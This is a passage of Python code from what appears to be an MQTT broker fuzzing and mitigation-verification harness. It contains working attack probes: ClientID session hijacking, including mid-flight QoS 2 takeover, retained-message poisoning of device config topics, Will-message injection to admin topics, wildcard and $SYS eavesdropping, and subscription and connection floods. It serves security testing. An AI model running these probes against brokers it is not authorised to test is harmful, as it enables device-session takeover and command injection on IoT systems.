                    "self_will_c3",
                    clean_session=True,
                    will_topic=will_topic,
                    will_message=b"my_own_will",
                    will_qos=0,
                    will_retain=False,
                ), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                client_conn.close(); res.notes = "CONNECT failed"; return res
            client_conn.send(build_subscribe(will_topic, packet_id=1, qos=0))
            client_conn.recv(timeout=1.0)  # SUBACK
            res.packets_sent = 3

            # Observer: separately subscribes to will_topic
            obs_conn = RawConn(self.host, self.port, timeout=5.0)
            obs_conn.connect()
            obs_conn.send_recv(build_connect("obs_will_c3", clean_session=True), timeout=2.0)
            obs_conn.send(build_subscribe(will_topic, packet_id=1, qos=0))
            obs_conn.recv(timeout=1.0)  # SUBACK
            res.packets_sent += 3

            # Ungracefully close client_conn (simulates crash — triggers Will)
            client_conn.close()
            time.sleep(0.5)

            # Observer checks for Will delivery
            obs_conn._sock.settimeout(3.0)
            will_received_by_obs = False
            try:
                data = obs_conn._sock.recv(4096)
                if data and (data[0] >> 4) == 3:  # PUBLISH
                    will_received_by_obs = True
                    res.notes = f"Observer received Will message ({len(data)} bytes)"
            except socket.timeout:
                pass
            obs_conn.close()

            res.broker_alive_after = broker_alive(self.host, self.port)
            if will_received_by_obs:
                res.anomaly = True
                res.anomaly_type = "WILL_SELF_DELIVERY_VECTOR"
                res.anomaly_detail = (
                    "Client's Will message (QoS 0, non-retain) was delivered to the observer "
                    "when client disconnected ungracefully. When the Will topic equals a topic "
                    "the dead client was subscribed to, a persistent session would receive its own Will "
                    "on reconnect. Combined with V1 (Will injection) and V3 (session hijacking), "
                    "this enables cross-client information injection via Will messages."
                )
            else:
                res.notes = "Observer did not receive Will message within timeout — Will may have been discarded"
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V29: Subscribe/Unsubscribe race ──────────────────────────────────
    def test_v29_subscribe_unsubscribe_race(self) -> TestResult:
        """
        V29: Rapid SUBSCRIBE/UNSUBSCRIBE alternation on same topic.
        Tests for state corruption in subscription table.
        """
        res = self._result("V29_SUB_UNSUB_RACE", "RACE_CONDITION",
                           "Rapid SUBSCRIBE/UNSUBSCRIBE alternation — state corruption")
        t0 = time.time()
        try:
            r, c = self._quick_connect("race_c3", clean=True)
            if not r:
                res.anomaly = True; res.anomaly_type = "CONNECT_FAILED"; c.close(); return res
            sp, rc = parse_connack(r)
            if rc != 0:
                c.close(); res.notes = f"CONNECT rejected RC={rc}"; return res
            topic = "fuzz/race_topic"
            res.packets_sent = 1
            for i in range(50):
                c.send(build_subscribe(topic, packet_id=(i % 65535) + 1, qos=0))
                c.send(build_unsubscribe(topic, packet_id=((i + 100) % 65535) + 1))
                res.packets_sent += 2
            # Drain any responses
            c._sock.settimeout(2.0)
            responses = []
            deadline = time.time() + 2.0
            while time.time() < deadline:
                try:
                    data = c._sock.recv(4096)
                    if data:
                        responses.append(data)
                except:
                    break

            # After race, try a final subscribe and publish — does delivery work?
            c.send(build_subscribe(topic, packet_id=9999, qos=0))
            c.recv(timeout=1.0)
            pub_conn = RawConn(self.host, self.port, timeout=3.0)
            pub_conn.connect()
            pub_conn.send_recv(build_connect("race_pub_c3", clean_session=True), timeout=2.0)
            pub_conn.send(build_publish(topic, b"post_race_msg", qos=0))
            pub_conn.close()
            r_post = c.recv(timeout=2.0)
            c.close()
            res.broker_alive_after = broker_alive(self.host, self.port)

            if not res.broker_alive_after:
                res.anomaly = True
                res.anomaly_type = "CRASH_ON_SUB_UNSUB_RACE"
                res.anomaly_detail = "Broker crashed after 50 SUBSCRIBE/UNSUBSCRIBE cycles"
            else:
                res.anomaly = True
                res.anomaly_type = "SUB_UNSUB_RACE_SURVIVED"
                res.anomaly_detail = (
                    f"Broker survived 50 rapid SUBSCRIBE/UNSUBSCRIBE cycles. "
                    f"Got {len(responses)} intermediate responses. "
                    f"Post-race message delivery: {'YES' if r_post else 'NO'}. "
                    "No crash detected but rapid alternation without rate limiting is a "
                    "denial-of-service surface — subscription table churn at high rate."
                )
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V30: Post-unsubscribe retained message delivery ──────────────────
    def test_v30_retained_after_unsubscribe(self) -> TestResult:
        """
        V30: Publish retained message, subscribe, verify receipt, unsubscribe,
        then re-subscribe. Does broker re-deliver the retained message on re-subscribe?
        Tests retained message state consistency.
        """
        res = self._result("V30_RETAINED_REDELIVERY", "SEMANTIC_VIOLATION",
                           "Retained message redelivered on re-subscribe after unsubscribe")
        t0 = time.time()
        topic = "fuzz/retained_unsub_c3"
        try:
            # First: publish retained message
            pub_conn = RawConn(self.host, self.port, timeout=3.0)
            pub_conn.connect()
            pub_conn.send_recv(build_connect("ret_pub_c3", clean_session=True), timeout=2.0)
            pub_conn.send(build_publish(topic, b"retained_payload_c3", qos=0, retain=True))
            pub_conn.close()
            time.sleep(0.2)

            # Subscribe, receive retained, unsubscribe, re-subscribe
            r, c = self._quick_connect("ret_sub_c3", clean=True)
            if not r or parse_connack(r)[1] != 0:
                c.close(); res.notes = "CONNECT failed"; return res
            c.send(build_subscribe(topic, packet_id=1, qos=0))
            c.recv(timeout=1.0)  # SUBACK
            r_retained1 = c.recv(timeout=2.0)  # Expect retained message delivery
            c.send(build_unsubscribe(topic, packet_id=2))
            c.recv(timeout=1.0)  # UNSUBACK
            time.sleep(0.2)
            c.send(build_subscribe(topic, packet_id=3, qos=0))
            c.recv(timeout=1.0)  # SUBACK
            r_retained2 = c.recv(timeout=2.0)  # Does it deliver retained again?
            c.close()
            res.packets_sent = 7 + 1

            first_delivery = r_retained1 and (r_retained1[0] >> 4) == 3
            second_delivery = r_retained2 and (r_retained2[0] >> 4) == 3

            res.broker_alive_after = broker_alive(self.host, self.port)
            if second_delivery:
                res.anomaly = True
                res.anomaly_type = "RETAINED_REDELIVERY_ON_RESUBSCRIBE"
                res.anomaly_detail = (
                    "Broker re-delivered retained message on re-subscribe after unsubscribe. "
                    "This is actually spec-compliant (§3.3.1.3) but has security implications: "
                    "an attacker who publishes a retained message to a sensitive topic will have "
                    "that message persistently delivered to any future subscriber — even after "
                    "all current subscribers have unsubscribed. Retained messages survive as "
                    "persistent injection payloads until explicitly cleared."
                )
            else:
                res.notes = f"First delivery: {first_delivery}, Second delivery: {second_delivery}"
            # Clean up retained message
            clean_conn = RawConn(self.host, self.port, timeout=3.0)
            clean_conn.connect()
            clean_conn.send_recv(build_connect("ret_clean_c3", clean_session=True), timeout=2.0)
            clean_conn.send(build_publish(topic, b"", qos=0, retain=True))  # Clear retained
            clean_conn.close()
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    # ── V31: QoS2 session takeover mid-flight ────────────────────────────
    def test_v31_qos2_session_takeover(self) -> TestResult:
        """
        V31: Start a QoS 2 PUBLISH flow (send PUBLISH, get PUBREC),
        then a second client connects with the same ClientID (session takeover).
        Tests what happens to the in-flight QoS 2 transaction.
        """
        res = self._result("V31_QOS2_SESSION_TAKEOVER", "STATE_MACHINE_VIOLATION",
                           "QoS2 flow interrupted by ClientID session takeover")
        t0 = time.time()
        client_id = "qos2_hijack_c3"
        topic = "fuzz/qos2_takeover"
        try:
            # Victim: start QoS 2 flow
            victim = RawConn(self.host, self.port, timeout=5.0)
            victim.connect()
            r = victim.send_recv(build_connect(client_id, clean_session=False, keepalive=60), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                victim.close(); res.notes = "Victim CONNECT failed"; return res

            # Victim subscribes so it will receive QoS 2 messages
            victim.send(build_subscribe(topic, packet_id=1, qos=2))
            victim.recv(timeout=1.0)  # SUBACK

            # Attacker: publish QoS 2 to topic
            attacker = RawConn(self.host, self.port, timeout=5.0)
            attacker.connect()
            attacker.send_recv(build_connect("attacker_c3", clean_session=True), timeout=2.0)
            attacker.send(build_publish(topic, b"qos2_in_flight", qos=2, packet_id=1))
            # Wait for PUBREC from broker (broker acknowledges receipt)
            r_pubrec = attacker.recv(timeout=2.0)
            in_flight_pubrec = r_pubrec and (r_pubrec[0] >> 4) == 5  # PUBREC

            # Victim should receive PUBLISH from broker
            victim._sock.settimeout(2.0)
            victim_received = False
            try:
                vdata = victim._sock.recv(4096)
                if vdata and (vdata[0] >> 4) == 3:
                    victim_received = True
                    # Send PUBREC back to broker (victim acknowledges)
                    pid = struct.unpack("!H", vdata[4:6])[0] if len(vdata) >= 6 else 1
                    victim.send(build_pubrec(pid))
            except socket.timeout:
                pass

            # NOW: hijack the victim's session mid-QoS2
            hijacker = RawConn(self.host, self.port, timeout=5.0)
            hijacker.connect()
            r_hijack = hijacker.send_recv(
                build_connect(client_id, clean_session=False, keepalive=60), timeout=3.0)
            hijack_rc = parse_connack(r_hijack)[1] if r_hijack else -1
            hijack_session_present = parse_connack(r_hijack)[0] if r_hijack else 0

            # Wait for any queued QoS 2 continuations
            hijacker._sock.settimeout(2.0)
            post_hijack_msgs = []
            deadline = time.time() + 2.5
            while time.time() < deadline:
                try:
                    data = hijacker._sock.recv(4096)
                    if data:
                        post_hijack_msgs.append(data)
                except:
                    break

            victim.close()
            attacker.close()
            hijacker.close()
            res.packets_sent = 8
            res.broker_alive_after = broker_alive(self.host, self.port)

            res.notes = (
                f"in_flight_pubrec={in_flight_pubrec}, victim_received={victim_received}, "
                f"hijack_rc={hijack_rc}, session_present={hijack_session_present}, "
                f"post_hijack_msgs={len(post_hijack_msgs)}"
            )
            if hijack_session_present == 1 and hijack_rc == 0:
                res.anomaly = True
                res.anomaly_type = "QOS2_SESSION_HIJACKED_WITH_IN_FLIGHT"
                res.anomaly_detail = (
                    "Hijacker successfully took over a session with an in-flight QoS 2 transaction. "
                    f"session_present=1 confirms existing session transferred. "
                    f"Post-hijack messages received: {len(post_hijack_msgs)}. "
                    "The broker transferred unresolved QoS 2 PUBREL/PUBCOMP state to the hijacker, "
                    "enabling the attacker to complete or abandon QoS 2 transactions initiated by the victim."
                )
            elif hijack_rc == 0:
                res.notes += " | hijack succeeded (no session_present) — QoS2 flow orphaned"
                res.anomaly = True
                res.anomaly_type = "QOS2_FLOW_ORPHANED_ON_TAKEOVER"
                res.anomaly_detail = (
                    "Session takeover occurred while QoS 2 flow was in progress. "
                    "The in-flight transaction was orphaned (neither completed nor properly aborted). "
                    "The receiving subscriber may have gotten a partial delivery."
                )
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    def run_all_new_tests(self) -> List[TestResult]:
        """Run all 14 new vulnerability tests (some will be deduplicated to 10 unique)."""
        print(f"  [V18] Max CONNECT fields...", end=" ", flush=True)
        self.test_v18_max_connect_fields(); print("done")
        print(f"  [V19] Subscribe topic flood...", end=" ", flush=True)
        self.test_v19_subscribe_flood_topics(); print("done")
        print(f"  [V20] Publish flood...", end=" ", flush=True)
        self.test_v20_publish_flood(); print("done")
        print(f"  [V21] PINGREQ flood...", end=" ", flush=True)
        self.test_v21_pingreq_flood(); print("done")
        print(f"  [V22] QoS downgrade...", end=" ", flush=True)
        self.test_v22_qos_downgrade(); print("done")
        print(f"  [V23] v5 DISCONNECT to v3 broker...", end=" ", flush=True)
        self.test_v23_v5_disconnect_to_v3_broker(); print("done")
        print(f"  [V24] Overlapping subscriptions...", end=" ", flush=True)
        self.test_v24_overlapping_subscriptions(); print("done")
        print(f"  [V25] Orphan PUBACK...", end=" ", flush=True)
        self.test_v25_orphan_puback(); print("done")
        print(f"  [V26] Invalid UTF-8 topics...", end=" ", flush=True)
        self.test_v26_invalid_utf8_topics(); print("done")
        print(f"  [V27] Keep-alive enforcement...", end=" ", flush=True)
        self.test_v27_keepalive_timeout_enforcement(); print("done")
        print(f"  [V28] Will self-delivery...", end=" ", flush=True)
        self.test_v28_will_self_delivery(); print("done")
        print(f"  [V29] Sub/Unsub race...", end=" ", flush=True)
        self.test_v29_subscribe_unsubscribe_race(); print("done")
        print(f"  [V30] Retained post-unsubscribe...", end=" ", flush=True)
        self.test_v30_retained_after_unsubscribe(); print("done")
        print(f"  [V31] QoS2 session takeover...", end=" ", flush=True)
        self.test_v31_qos2_session_takeover(); print("done")
        return self.results


# ─────────────────────────────────────────────────────────────
# Goal 1: Mitigation Verification Tests
# ─────────────────────────────────────────────────────────────

class MitigationVerifier:
    """Verifies that mitigations are effective (run against hardened broker)."""

    def __init__(self, host: str = "localhost", port: int = 1883):
        self.host = host
        self.port = port
        self.results: List[Dict] = []

    def _log(self, vuln_id: str, test: str, passed: bool, detail: str) -> Dict:
        r = {
            "vuln_id": vuln_id,
            "test": test,
            "mitigation_effective": passed,
            "status": "PASS" if passed else "FAIL",
            "detail": detail,
            "timestamp": datetime.utcnow().isoformat(),
        }
        self.results.append(r)
        return r

    def verify_v1_will_acl(self) -> Dict:
        """V1: Will message to admin topic should be BLOCKED by ACL."""
        try:
            c = RawConn(self.host, self.port, timeout=4.0)
            c.connect()
            r = c.send_recv(build_connect(
                "v1_test",
                will_topic="admin/control",
                will_message=b"malicious_will",
                will_qos=0,
            ), timeout=3.0)
            c.close()
            if r:
                sp, rc = parse_connack(r)
                passed = (rc != 0)  # Should reject CONNECT with unauthorized will topic
                return self._log("V1", "Will ACL enforcement",
                                 passed,
                                 f"CONNACK RC={rc:#04x} ({'BLOCKED' if passed else 'ACCEPTED — mitigation failed'})")
            else:
                return self._log("V1", "Will ACL enforcement", False,
                                 "No CONNACK — inconclusive")
        except Exception as e:
            return self._log("V1", "Will ACL enforcement", False, str(e))

    def verify_v2_retain_acl(self) -> Dict:
        """V2: Retained message to sensitive topic should be BLOCKED."""
        try:
            c = RawConn(self.host, self.port, timeout=4.0)
            c.connect()
            r = c.send_recv(build_connect("v2_test"), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                c.close()
                return self._log("V2", "Retain ACL", False, "Could not connect to test")
            c.send(build_publish("devices/thermostat/config", b"ATTACKER", retain=True))
            time.sleep(0.3)
            # If broker has ACL, publish was silently denied — check by subscribing
            c.send(build_subscribe("devices/thermostat/config", packet_id=2, qos=0))
            c.recv(timeout=1.0)  # SUBACK
            retained = c.recv(timeout=2.0)
            c.close()
            # If retained message is delivered, mitigation failed
            if retained and (retained[0] >> 4) == 3:
                return self._log("V2", "Retain ACL", False,
                                 "Retained message still delivered — ACL did not block PUBLISH")
            else:
                return self._log("V2", "Retain ACL", True,
                                 "No retained message delivered — ACL appears to block unauthorized PUBLISH")
        except Exception as e:
            return self._log("V2", "Retain ACL", False, str(e))

    def verify_v3_clientid_hijacking(self) -> Dict:
        """V3: Second CONNECT with same ClientID should be rejected (or rate-limited)."""
        try:
            cid = "v3_victim_device"
            c1 = RawConn(self.host, self.port, timeout=4.0)
            c1.connect()
            r1 = c1.send_recv(build_connect(cid, clean_session=False, keepalive=60), timeout=3.0)
            if not r1 or parse_connack(r1)[1] != 0:
                c1.close()
                return self._log("V3", "ClientID hijacking prevention", False, "Setup CONNECT failed")
            # Now hijack
            c2 = RawConn(self.host, self.port, timeout=4.0)
            c2.connect()
            r2 = c2.send_recv(build_connect(cid, clean_session=False, keepalive=60), timeout=3.0)
            c1.close(); c2.close()
            if r2:
                sp2, rc2 = parse_connack(r2)
                # Mitigation: second CONNECT should fail OR rate-limited
                passed = (rc2 != 0)
                return self._log("V3", "ClientID hijacking prevention", passed,
                                 f"Second CONNECT RC={rc2:#04x}, session_present={sp2} "
                                 f"({'BLOCKED' if passed else 'HIJACK SUCCEEDED — mitigation failed'})")
            else:
                return self._log("V3", "ClientID hijacking prevention", True,
                                 "No CONNACK to second CONNECT — may be rate-limited")
        except Exception as e:
            return self._log("V3", "ClientID hijacking prevention", False, str(e))

    def verify_v4_wildcard_subscription(self) -> Dict:
        """V4: Anonymous client subscribing to '#' should be denied."""
        try:
            c = RawConn(self.host, self.port, timeout=4.0)
            c.connect()
            r = c.send_recv(build_connect("v4_test"), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                c.close()
                return self._log("V4", "Wildcard sub ACL", False, "CONNECT failed")
            c.send(build_subscribe("#", packet_id=1, qos=0))
            r2 = c.recv(timeout=2.0)
            c.close()
            if r2:
                codes = parse_suback_codes(r2)
                denied = any(code == 0x80 for code in codes)
                return self._log("V4", "Wildcard sub ACL", denied,
                                 f"SUBACK codes={codes} ({'DENIED' if denied else 'GRANTED — mitigation failed'})")
            return self._log("V4", "Wildcard sub ACL", False, "No SUBACK")
        except Exception as e:
            return self._log("V4", "Wildcard sub ACL", False, str(e))

    def verify_v6_sys_topic(self) -> Dict:
        """V6: Anonymous client subscribing to $SYS/# should be denied."""
        try:
            c = RawConn(self.host, self.port, timeout=4.0)
            c.connect()
            r = c.send_recv(build_connect("v6_test"), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                c.close()
                return self._log("V6", "$SYS ACL", False, "CONNECT failed")
            c.send(build_subscribe("$SYS/#", packet_id=1, qos=0))
            r2 = c.recv(timeout=2.0)  # SUBACK
            c.recv(timeout=2.0)  # Should NOT receive $SYS data
            r3 = c.recv(timeout=2.0)
            c.close()
            if r3 and (r3[0] >> 4) == 3:
                return self._log("V6", "$SYS ACL", False,
                                 "$SYS data still delivered — ACL did not block $SYS subscription")
            else:
                return self._log("V6", "$SYS ACL", True,
                                 "No $SYS data received — ACL blocks $SYS subscription")
        except Exception as e:
            return self._log("V6", "$SYS ACL", False, str(e))

    def verify_v8_auth(self) -> Dict:
        """V8: With require_authentication, anonymous connects should fail."""
        try:
            c = RawConn(self.host, self.port, timeout=4.0)
            c.connect()
            r = c.send_recv(build_connect("v8_anon_test", username=None, password=None), timeout=3.0)
            c.close()
            if r:
                sp, rc = parse_connack(r)
                passed = (rc != 0)
                return self._log("V8", "Anonymous auth blocked", passed,
                                 f"Anon CONNECT RC={rc:#04x} ({'BLOCKED' if passed else 'ACCEPTED — auth not enforced'})")
            return self._log("V8", "Anonymous auth blocked", False, "No CONNACK")
        except Exception as e:
            return self._log("V8", "Anonymous auth blocked", False, str(e))

    def verify_v9_shared_subscription(self) -> Dict:
        """V9: Malformed $share/ should be rejected by ACL or protocol parsing."""
        try:
            c = RawConn(self.host, self.port, timeout=4.0)
            c.connect()
            r = c.send_recv(build_connect("v9_test"), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                c.close()
                return self._log("V9", "Shared sub validation", False, "CONNECT failed")
            # Send malformed shared subscription
            c.send(build_subscribe("$share//topic", packet_id=1, qos=0))
            r2 = c.recv(timeout=2.0)
            c.close()
            if r2:
                codes = parse_suback_codes(r2)
                denied = any(code == 0x80 for code in codes)
                return self._log("V9", "Shared sub validation", denied,
                                 f"$share//topic SUBACK codes={codes} ({'DENIED' if denied else 'GRANTED'})")
            return self._log("V9", "Shared sub validation", False, "No SUBACK")
        except Exception as e:
            return self._log("V9", "Shared sub validation", False, str(e))

    def verify_v10_qos_state(self) -> Dict:
        """V10: PUBLISH QoS 1 with PID=0 should be rejected."""
        try:
            c = RawConn(self.host, self.port, timeout=4.0)
            c.connect()
            r = c.send_recv(build_connect("v10_test"), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                c.close()
                return self._log("V10", "QoS PID=0 rejection", False, "CONNECT failed")
            c.send(build_publish("test/qos1", b"payload", qos=1, packet_id=0))
            r2 = c.recv(timeout=2.0)
            c.close()
            alive = broker_alive(self.host, self.port)
            if not alive:
                return self._log("V10", "QoS PID=0 rejection", False, "Broker crashed on PID=0")
            if r2:
                pkt_type = (r2[0] >> 4) if r2 else 0
                if pkt_type == 14:  # DISCONNECT
                    return self._log("V10", "QoS PID=0 rejection", True,
                                     "Broker sent DISCONNECT for QoS1 PID=0 — correct per §2.3.1")
                else:
                    return self._log("V10", "QoS PID=0 rejection", False,
                                     f"Broker sent unexpected packet type {pkt_type}")
            return self._log("V10", "QoS PID=0 rejection", False,
                             "No DISCONNECT sent for QoS1 PID=0 — broker still accepts invalid PID")
        except Exception as e:
            return self._log("V10", "QoS PID=0 rejection", False, str(e))

    def verify_v11_session_resource(self) -> Dict:
        """V11: Connection flood should be rate-limited."""
        try:
            t0 = time.time()
            succeeded = 0
            conns = []
            for i in range(100):
                c = RawConn(self.host, self.port, timeout=1.0)
                if c.connect():
                    r = c.send_recv(build_connect(f"flood_{i}", clean_session=True), timeout=1.0)
                    if r and parse_connack(r)[1] == 0:
                        succeeded += 1
                    conns.append(c)
            elapsed = time.time() - t0
            for c in conns:
                c.close()
            rate = succeeded / max(elapsed, 0.001)
            # Mitigation effective if rate is severely limited (< 10/s) or many rejected
            passed = (succeeded < 50 or rate < 10)
            return self._log("V11", "Connection rate limiting", passed,
                             f"100 connections: {succeeded} succeeded in {elapsed:.2f}s ({rate:.0f}/s) "
                             f"({'RATE LIMITED' if passed else 'NO RATE LIMIT — mitigation failed'})")
        except Exception as e:
            return self._log("V11", "Connection rate limiting", False, str(e))

    def verify_v17_fingerprint(self) -> Dict:
        """V17: $SYS version info should not be accessible to anonymous clients."""
        try:
            c = RawConn(self.host, self.port, timeout=4.0)
            c.connect()
            r = c.send_recv(build_connect("v17_test"), timeout=3.0)
            if not r or parse_connack(r)[1] != 0:
                c.close()
                return self._log("V17", "Version fingerprint suppression", True,
                                 "CONNECT rejected — fingerprinting prevented at connection level")
            c.send(build_subscribe("$SYS/broker/version", packet_id=1, qos=0))
            c.recv(timeout=1.0)  # SUBACK
            version_data = c.recv(timeout=3.0)
            c.close()
            if version_data and (version_data[0] >> 4) == 3:
                return self._log("V17", "Version fingerprint suppression", False,
                                 "Version string still delivered to anonymous client — $SYS not restricted")
            return self._log("V17", "Version fingerprint suppression", True,
                             "No version data received — $SYS access restricted")
        except Exception as e:
            return self._log("V17", "Version fingerprint suppression", False, str(e))

    def run_all(self) -> List[Dict]:
        """Run all mitigation verification tests against current broker."""
        print("  [V1]  Will ACL...", end=" ", flush=True)
        self.verify_v1_will_acl(); print("done")
        print("  [V2]  Retain ACL...", end=" ", flush=True)
        self.verify_v2_retain_acl(); print("done")
        print("  [V3]  ClientID hijacking...", end=" ", flush=True)
        self.verify_v3_clientid_hijacking(); print("done")
        print("  [V4]  Wildcard subscription...", end=" ", flush=True)
        self.verify_v4_wildcard_subscription(); print("done")
        print("  [V6]  $SYS topic...", end=" ", flush=True)
        self.verify_v6_sys_topic(); print("done")
        print("  [V8]  Auth...", end=" ", flush=True)
        self.verify_v8_auth(); print("done")
        print("  [V9]  Shared sub...", end=" ", flush=True)
        self.verify_v9_shared_subscription(); print("done")
        print("  [V10] QoS state machine...", end=" ", flush=True)
        self.verify_v10_qos_state(); print("done")
        print("  [V11] Session resource...", end=" ", flush=True)
        self.verify_v11_session_resource(); print("done")
        print("  [V17] Config fingerprint...", end=" ", flush=True)
        self.verify_v17_fingerprint(); print("done")
        return self.results


# ─────────────────────────────────────────────────────────────
# Goal 3: Multi-Broker Catalog Replay
# ─────────────────────────────────────────────────────────────

class BrokerCatalogFuzzer:
    """Replays the full V1-V17 vulnerability catalog against any broker."""

    def __init__(self, host: str, port: int, broker_label: str):
        self.host = host
        self.port = port
        self.label = broker_label
        self.results: List[TestResult] = []

    def _result(self, test_id: str, category: str, description: str) -> TestResult:
        return TestResult(
            test_id=test_id, category=category, description=description,
            host=self.host, port=self.port, broker_label=self.label,
        )

    def _connect(self, client_id: str = "cat_fuzz", clean: bool = True,
                 keepalive: int = 60, **kwargs) -> Tuple[Optional[bytes], RawConn]:
        c = RawConn(self.host, self.port, timeout=5.0)
        if not c.connect():
            return None, c
        r = c.send_recv(build_connect(client_id, clean_session=clean,
                                      keepalive=keepalive, **kwargs), timeout=4.0)
        return r, c

    def test_v1_will_injection(self) -> TestResult:
        res = self._result("V1_WILL_INJECTION", "AUTH_BYPASS", "Will to admin/control topic")
        t0 = time.time()
        try:
            # Observer subscribes first
            obs = RawConn(self.host, self.port, timeout=5.0)
            obs.connect()
            obs.send_recv(build_connect("obs_v1", clean_session=True), timeout=3.0)
            obs.send(build_subscribe("admin/control", packet_id=1, qos=0))
            obs.recv(timeout=2.0)  # SUBACK

            # Attacker connects with Will to admin/control
            atk = RawConn(self.host, self.port, timeout=5.0)
            atk.connect()
            r = atk.send_recv(build_connect(
                "atk_v1", will_topic="admin/control",
                will_message=b"ATTACKER_WILL", will_qos=0, will_retain=False,
            ), timeout=3.0)
            res.packets_sent = 4
            connected = r and parse_connack(r)[1] == 0
            atk.close()  # Trigger Will
            time.sleep(0.5)

            obs_recv = obs.recv(timeout=2.0)
            obs.close()
            will_delivered = obs_recv and (obs_recv[0] >> 4) == 3
            res.connack_rc = parse_connack(r)[1] if r else -1
            res.broker_alive_after = broker_alive(self.host, self.port)
            if will_delivered:
                res.anomaly = True
                res.anomaly_type = "WILL_DELIVERED_TO_ADMIN_TOPIC"
                res.anomaly_detail = "Will message delivered to admin/control without authorization"
            else:
                res.notes = f"Will not delivered (connected={connected}, connack_rc={res.connack_rc})"
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    def test_v2_retained_poison(self) -> TestResult:
        res = self._result("V2_RETAINED_POISON", "DATA_INTEGRITY", "Retained message poisoning")
        t0 = time.time()
        try:
            r, c = self._connect("v2_pub")
            if not r or parse_connack(r)[1] != 0:
                c.close(); res.notes = "CONNECT failed"; self.results.append(res); return res
            c.send(build_publish("devices/thermostat/setpoint", b"ATTACKER_RETAINED", retain=True))
            res.packets_sent = 2
            time.sleep(0.3)
            c.close()
            # Check if retained was stored
            r2, c2 = self._connect("v2_sub")
            if r2 and parse_connack(r2)[1] == 0:
                c2.send(build_subscribe("devices/thermostat/setpoint", packet_id=1, qos=0))
                c2.recv(timeout=1.0)  # SUBACK
                retained = c2.recv(timeout=2.0)
                res.packets_sent += 3
                if retained and (retained[0] >> 4) == 3:
                    res.anomaly = True
                    res.anomaly_type = "RETAINED_MESSAGE_ACCEPTED"
                    res.anomaly_detail = "Attacker retained message stored and delivered to subscriber"
            c2.close()
            res.broker_alive_after = broker_alive(self.host, self.port)
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    def test_v3_session_hijacking(self) -> TestResult:
        res = self._result("V3_SESSION_HIJACKING", "AUTH_BYPASS", "ClientID session hijacking")
        t0 = time.time()
        try:
            cid = "cat_victim_device"
            c1 = RawConn(self.host, self.port, timeout=5.0)
            c1.connect()
            r1 = c1.send_recv(build_connect(cid, clean_session=False, keepalive=60), timeout=3.0)
            rc1 = parse_connack(r1)[1] if r1 else -1
            if rc1 != 0:
                c1.close(); res.notes = f"Victim CONNECT RC={rc1}"; self.results.append(res); return res
            # Hijacker
            c2 = RawConn(self.host, self.port, timeout=5.0)
            c2.connect()
            r2 = c2.send_recv(build_connect(cid, clean_session=False, keepalive=60), timeout=3.0)
            sp2, rc2 = parse_connack(r2)[0], parse_connack(r2)[1] if r2 else (-1, -1)
            c1.close(); c2.close()
            res.connack_rc = rc2
            res.session_present = bool(sp2)
            res.packets_sent = 4
            res.broker_alive_after = broker_alive(self.host, self.port)
            if rc2 == 0:
                res.anomaly = True
                res.anomaly_type = "SESSION_HIJACK_SUCCEEDED"
                res.anomaly_detail = (f"Hijacker got CONNACK RC=0, session_present={sp2}. "
                                      "Victim's session was taken over.")
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    def test_v4_wildcard_sub(self) -> TestResult:
        res = self._result("V4_WILDCARD_SUB", "PRIVACY", "Anonymous '#' subscription")
        t0 = time.time()
        try:
            r, c = self._connect("v4_anon")
            if not r or parse_connack(r)[1] != 0:
                c.close(); res.notes = "CONNECT failed"; self.results.append(res); return res
            c.send(build_subscribe("#", packet_id=1, qos=0))
            r2 = c.recv(timeout=2.0)
            c.close()
            codes = parse_suback_codes(r2) if r2 else []
            res.suback_codes = codes
            res.packets_sent = 3
            res.broker_alive_after = broker_alive(self.host, self.port)
            if codes and all(c != 0x80 for c in codes):
                res.anomaly = True
                res.anomaly_type = "WILDCARD_GRANTED_TO_ANON"
                res.anomaly_detail = f"'#' subscription granted to anonymous client: SUBACK codes={codes}"
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    def test_v6_sys_topic(self) -> TestResult:
        res = self._result("V6_SYS_EXPOSURE", "INFO_DISCLOSURE", "$SYS topic exposure")
        t0 = time.time()
        try:
            r, c = self._connect("v6_anon")
            if not r or parse_connack(r)[1] != 0:
                c.close(); res.notes = "CONNECT failed"; self.results.append(res); return res
            c.send(build_subscribe("$SYS/#", packet_id=1, qos=0))
            r2 = c.recv(timeout=2.0)  # SUBACK
            sys_data = c.recv(timeout=3.0)
            c.close()
            res.packets_sent = 3
            res.broker_alive_after = broker_alive(self.host, self.port)
            if sys_data and (sys_data[0] >> 4) == 3:
                res.anomaly = True
                res.anomaly_type = "SYS_DATA_EXPOSED"
                res.anomaly_detail = f"$SYS data delivered to anonymous client ({len(sys_data)} bytes)"
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

